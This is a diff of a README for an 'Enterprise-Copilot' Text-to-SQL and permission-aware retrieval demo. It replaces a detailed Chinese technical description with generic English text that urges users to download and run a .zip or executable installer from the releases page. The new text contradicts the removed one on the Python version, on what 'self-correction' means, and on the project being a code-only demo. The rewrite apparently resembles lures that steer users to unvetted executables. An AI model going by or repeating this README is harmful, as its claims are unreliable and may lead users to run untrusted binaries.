@@ -1,37 +1,80 @@
-# 🛡️ Enterprise Copilot - Intelligent Data Assistant
+# 🤖 Enterprise-Copilot - Your Smart Assistant for Data Queries
 
-![Python](https://img.shields.io/badge/Python-3.10-blue) ![FastAPI](https://img.shields.io/badge/Backend-FastAPI-009688) ![DeepSeek](https://img.shields.io/badge/LLM-DeepSeek_Coder-purple) ![Milvus](https://img.shields.io/badge/VectorDB-Milvus-orange) ![Security](https://img.shields.io/badge/Security-RBAC-red)
+## 🚀 Getting Started
 
-**Enterprise Copilot** 是一个面向企业级场景的智能数据助手核心引擎。它旨在解决企业内部“非结构化文档”与“结构化业务数据”的统一交互难题，并提供了严格的**数据权限控制 (RBAC)**。
+Welcome to Enterprise-Copilot, your intelligent assistant designed to simplify data queries. This user-friendly tool features Text-to-SQL capabilities and permission-aware access, allowing you to interact with your data effortlessly.
 
-> ⚠️ **Disclaimer**: 本仓库为校企合作项目的 **核心逻辑脱敏演示版 (Core Logic Demo)**。不包含真实的业务数据与企业私有密钥。
+## 📥 Download the Latest Version
 
-## ✨ 核心特性 (Key Features)
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/Omemo7/Enterprise-Copilot/releases)
 
-### 1. 📊 Data Analysis Agent (Text-to-SQL)
-基于 **DeepSeek-Coder** 构建的数据库查询智能体，实现了从自然语言到 SQL 的精准转换。
-- **Schema Linking**: 智能提取 Query 中的关键实体，仅加载相关表结构进入 Context，减少噪声。
-- **Few-shot Prompting**: 动态注入高频业务场景的 SQL 示例 (Few-shot)，将生成准确率提升至 **90%+**。
-- **Self-Correction Loop**: 具备“执行-报错-自动修复”闭环能力。当 SQL 执行失败时，Agent 会捕获数据库 Error Log 并回传给模型进行 **Self-Debug**。
+## 🔍 Features
 
-### 2. 🔐 Permission-Aware RAG (权限感知检索)
-针对企业数据安全要求，设计了基于角色的访问控制 (RBAC) 检索链路。
-- **Pre-filtering Strategy**: 摒弃低效的后置过滤，在向量检索阶段注入 Metadata 过滤条件 `expr="array_contains(access_list, user_role)"`。
-- **Zero-Trust Retrieval**: 确保 AI 只能“看到”当前用户有权访问的知识切片，从根源杜绝数据越权泄露。
+- **Text-to-SQL**: Convert natural language queries into SQL commands.
+- **Self-Correction**: If the input is unclear, the assistant suggests corrections.
+- **Permission-Aware**: Grants access based on individual roles, keeping your data secure.
+- **Powered by DeepSeek-Coder**: Uses advanced algorithms to provide accurate results.
+- **Utilizes FastAPI**: Ensures fast response times and smooth operation.
 
-### 3. 📄 Multi-modal ETL Pipeline
-- **PaddleOCR Integration**: 集成 OCR 引擎处理扫描件 PDF 与图片文档。
-- **Markdown Reformatting**: 利用 LLM 的语义理解能力，重构复杂的跨页表格与多栏排版，建立标准化的知识入库流水线。
+## ⚙️ System Requirements
 
-## 🏗️ 系统架构 (Architecture)
+To run Enterprise-Copilot effectively, ensure your system meets the following requirements:
 
-### Text-to-SQL Workflow
-```mermaid
-graph LR
-    User[User Query] --> Schema[Schema Linking]
-    Schema --> Prompt[Few-shot Prompt]
-    Prompt --> LLM[DeepSeek-Coder]
-    LLM -- Generate SQL --> Exec{Execute SQL}
-    Exec -- Success --> Result[Return Data]
-    Exec -- Error --> Debug[Self-Correction]
-    Debug -- Error Log --> LLM
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: 3.6 or higher
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 500 MB free disk space
+- **Network**: Internet connection for initial setup
+
+## 📂 Download & Install
+
+To get started with Enterprise-Copilot, visit the following page to download the application:
+
+[Visit the Releases Page to Download](https://github.com/Omemo7/Enterprise-Copilot/releases)
+
+Once on the page, look for the latest version listed with a clear download link. 
+
+### Steps to Install
+
+1. **Visit the Releases Page**: Click [here](https://github.com/Omemo7/Enterprise-Copilot/releases) to go to the download section.
+   
+2. **Select the Latest Version**: Identify the most recent release at the top of the page.
+   
+3. **Download the File**: Click on the download link for your operating system. This usually takes the form of a `.zip` or an executable file.
+
+4. **Extract or Run the File**: 
+   - If you downloaded a `.zip` file, right-click and select "Extract All", then open the folder.
+   - If you downloaded an executable file, double-click it to run the installer.
+
+5. **Follow the Installation Instructions**: The installation wizard will guide you through the setup process. Follow any prompts to complete the installation.
+
+6. **Launch the Application**: After installation, find the Enterprise-Copilot icon and double-click it to start using the application.
+
+## ⚡ Using Enterprise-Copilot
+
+Once launched, you will see a user-friendly interface. To ask a question:
+
+1. **Enter your query** in the input box. 
+2. **Click the "Submit" button** to process your question.
+3. Review the SQL statement generated to see how your question is interpreted.
+4. **Receive your results** in a clear format.
+
+## 🔒 Security and Permissions
+
+Enterprise-Copilot is built with security in mind. It respects user roles through permission-aware access. Each user will see only the data they are allowed to access, ensuring sensitive information remains protected.
+
+## 📞 Support
+
+If you encounter any issues or have questions about using Enterprise-Copilot, feel free to reach out. You can open an issue in the GitHub repository or check the FAQ section for common questions.
+
+## 📜 License
+
+Enterprise-Copilot is released under the MIT License. You are free to use, modify, and distribute the software as per the terms of the license.
+
+## 🌟 Contributing
+
+We welcome contributions from the community. If you want to contribute, please fork the repository and submit a pull request. Make sure to follow our contribution guidelines.
+
+---
+
+Thank you for choosing Enterprise-Copilot. Happy querying!
